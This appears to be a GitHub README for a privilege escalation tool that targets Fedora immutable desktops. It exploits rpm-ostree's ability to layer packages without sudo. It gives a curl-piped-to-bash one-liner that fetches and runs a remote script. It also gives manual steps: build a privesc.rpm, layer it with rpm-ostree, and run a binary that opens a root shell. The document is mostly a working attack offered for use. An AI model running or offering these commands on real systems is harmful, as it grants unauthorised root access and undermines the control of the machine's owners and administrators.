A privilege escalation tool for Fedora immutable desktops (Silverblue, Kinoite, etc.), using the fact that `rpm-ostree` doesn't need `sudo`.

This is considered intended behavior: https://discussion.fedoraproject.org/t/76173/2, https://github.com/coreos/rpm-ostree/issues/745, https://github.com/coreos/rpm-ostree/pull/825

## One-Liner
```
bash <(curl https://raw.githubusercontent.com/rohanssrao/silverblue-privesc/main/privesc.sh)
```

## Manual

**Requirements:**

```bash
dnf install rpmdevtools gcc glibc-static
```

**Building:**

```bash
rpmbuild --bb --define "_rpmdir $(pwd)" --define "_rpmfilename privesc.rpm" privesc.spec
```
This generates `privesc.rpm` in the current directory.

**Usage:**

```bash
# Layer package
rpm-ostree install privesc.rpm
# Enter root shell
"$(ls -td /ostree/deploy/fedora/deploy/*/ | head -1)"/usr/bin/privesc
```
